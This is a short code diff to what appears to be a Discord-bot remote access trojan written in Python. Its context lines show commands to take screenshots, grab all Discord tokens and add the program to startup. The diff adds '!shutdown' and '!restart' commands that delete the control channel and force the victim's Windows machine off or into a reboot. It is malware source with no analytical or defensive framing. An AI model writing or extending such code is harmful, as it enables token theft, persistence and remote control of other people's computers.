@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys, platform, psutil
+import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
 
 def get_processor():
     stdout = subprocess.Popen(
@@ -48,6 +48,8 @@ commands = "\n".join([
     "!screenshot - Take a screenshot",
     "!tokens - Get all discord tokens",
     "!startup - Add to startup",
+    "!shutdown - Shutdown the computer",
+    "!restart - Restart the computer",
 ])
 
 @bot.event
@@ -189,6 +191,16 @@ async def on_message(message):
         except:
             embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
             await message.reply(embed=embed)
+
+    if message.content == "!shutdown":
+        await message.channel.delete()
+        await bot.close()
+        os.system("shutdown /s /t 0")
+
+    if message.content == "!restart":
+        await message.channel.delete()
+        await bot.close()
+        os.system("shutdown /r /t 0")
 
 bot.run(token, log_handler=None)
 
